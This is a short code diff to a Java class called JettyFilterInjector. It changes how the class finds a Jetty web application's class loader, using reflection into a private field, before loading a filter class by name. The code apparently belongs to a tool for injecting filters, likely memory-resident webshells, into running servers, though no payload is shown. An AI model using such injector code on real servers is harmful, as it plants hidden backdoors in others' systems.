@@ -165,13 +165,18 @@ public class JettyFilterInjector {
     }
 
 
-    private Object getFilter(Object context) {
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return (ClassLoader) invokeMethod(context, "getClassLoader");
+        } catch (Exception ignored) {
+            return (ClassLoader) getFieldValue(context, "_classLoader");
+        }
+    }
+
+    private Object getFilter(Object context) throws Exception {
 
         Object filter = null;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             filter = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
